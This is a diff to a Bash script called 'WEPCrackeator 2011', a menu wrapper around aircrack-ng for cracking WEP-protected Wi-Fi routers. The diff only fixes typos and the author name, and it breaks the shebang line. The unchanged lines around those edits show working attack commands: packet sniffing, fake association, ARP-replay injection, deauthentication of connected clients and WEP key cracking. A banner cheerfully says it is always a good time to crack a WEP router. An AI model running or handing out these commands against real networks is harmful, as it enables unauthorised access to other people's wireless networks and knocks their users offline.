@@ -1,4 +1,4 @@
-#!/bin/bash
+#bin/bash
 
 #Global VARs
 
@@ -21,7 +21,7 @@ echo -e "*"$RED"                      WEPCrackeator 2011                       "
 echo -e "*****************************************************************"
 echo -e "*"$YELLOW"    Siempre es buen momento para crackear un router WEP  :D    "$ENDCOLOR"*"
 echo -e "*****************************************************************"
-echo -e "*"$PURPLE"                       Made by SeRGiNaToR                      "$ENDCOLOR"*"
+echo -e "*"$PURPLE"                       Made by serginator                      "$ENDCOLOR"*"
 echo -e "*"$PURPLE"                    28-01-2011 - "$BLINK"versión 1.0"$ENDBLINK"                   "$ENDCOLOR"*"
 echo -e "*****************************************************************"
 echo
@@ -69,12 +69,12 @@ do
 	echo -e "*****************************************************************"
 	echo -e "*"$YELLOW"    Siempre es buen momento para crackear un router WEP  :D    "$ENDCOLOR"*"
 	echo -e "*****************************************************************"
-	echo -e "*"$PURPLE"                       Made by SeRGiNaToR                      "$ENDCOLOR"*"
+	echo -e "*"$PURPLE"                       Made by serginator                      "$ENDCOLOR"*"
 	echo -e "*"$PURPLE"                    28-01-2011 - "$BLINK"versión 1.0"$ENDBLINK"                   "$ENDCOLOR"*"
 	echo -e "*****************************************************************"
 	echo "1) Launch airodump-ng."
 	echo "2) Launch airodump-ng against a chosen network."
-	echo "3) Asociate"
+	echo "3) Associate"
 	echo "4) Launch aireplay-ng (-p 0841)"
 	echo "5) Launch aireplay-ng with ARP injection"
 	echo "6) ChopChop"
@@ -109,7 +109,7 @@ do
 		xterm -geometry 90x15+500+0 -fg yellow -bg black -hold -title "Sniffing $APNAME packets..." -e airodump-ng mon0 -a --bssid $MACAP --channel $CHANNEL --ivs -w out &
 		;;
 	3)
-		xterm -geometry 90x15+0+200 -fg yellow -bg black -hold -title "Asociating with $APNAME..." -e aireplay-ng -1 6000 -o 1 -q 10 --ignore-negative-one -a $MACAP -h $MIMAC mon0 &
+		xterm -geometry 90x15+0+200 -fg yellow -bg black -hold -title "Associating with $APNAME..." -e aireplay-ng -1 6000 -o 1 -q 10 --ignore-negative-one -a $MACAP -h $MIMAC mon0 &
 		;;
 	4)
 		xterm -geometry 90x15+500+200 -fg yellow -bg black -hold -title "Attacking $APNAME with -p 0841..." -e aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $MACAP -h $MIMAC --ignore-negative-one mon0 &
@@ -130,7 +130,7 @@ do
 		xterm -geometry 90x15+500+400 -fg yellow -bg black -hold -title "Attacking $APNAME injecting created packets..." -e aireplay-ng -2 -r arp-request -h $MIMAC --ignore-negative-one mon0 &
 		;;
 	10)
-		xterm -geometry 90x15+0+200 -fg yellow -bg black -hold -title "Deautentify clients in $APNAME..." -e aireplay-ng -0 5 -a $MACAP --ignore-negative-one mon0 &
+		xterm -geometry 90x15+0+200 -fg yellow -bg black -hold -title "Deauthenticate clients in $APNAME..." -e aireplay-ng -0 5 -a $MACAP --ignore-negative-one mon0 &
 		;;
 	11)
 		xterm -geometry 100x30+0+400 -fg yellow -bg black -hold -title "Cracking $APNAME..." -e aircrack-ng -a 1 *.cap
